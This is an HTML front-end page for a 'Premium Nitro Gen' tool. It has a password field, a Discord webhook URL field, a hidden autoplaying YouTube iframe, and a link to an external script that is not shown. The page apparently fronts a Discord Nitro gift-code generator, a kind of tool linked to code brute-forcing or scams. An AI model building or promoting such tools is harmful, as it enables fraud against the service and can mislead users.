<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Nitro Gen</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        /* Hide the YouTube iframe */
        #backgroundMusic {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Premium Nitro Gen</h1>
        <p>This tool was made by Zane. For issues, contact zane_ox0 on Discord.</p>
        
        <form id="toolForm">
            <label for="password">Enter Password:</label>
            <input type="password" id="password" required>

            <label for="webhookUrl">Discord Webhook URL:</label>
            <input type="url" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." required>

            <button type="submit" id="generateButton">Start Generating</button>
        </form>
        
        <div class="result" id="result"></div>
    </div>
    
    <!-- YouTube video embedded as background music -->
    <iframe id="backgroundMusic" src="https://www.youtube.com/embed/lI-rZIdOZ6o?autoplay=1&loop=1&playlist=lI-rZIdOZ6o" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    
    <script src="script.js"></script>
</body>
</html>
